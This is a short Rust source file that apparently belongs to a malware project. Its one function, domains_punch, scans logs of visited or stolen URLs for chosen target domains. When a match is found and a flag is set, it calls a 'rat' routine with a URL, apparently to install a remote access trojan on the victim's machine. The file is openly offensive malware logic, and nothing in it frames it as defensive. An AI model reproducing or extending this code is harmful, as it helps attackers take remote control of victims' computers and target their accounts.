use crate::Log;
use crate::rat::rat;

pub fn domains_punch(domains: Vec<String>, logs: Vec<Log>, rat_url: String, install_rat_on_special_domains: bool) {
    for domain in domains {
        for log in &logs {
            if log.url.contains(&domain) {
                if install_rat_on_special_domains {
                    rat(rat_url);
                    return
                }
            }
        }
    }
}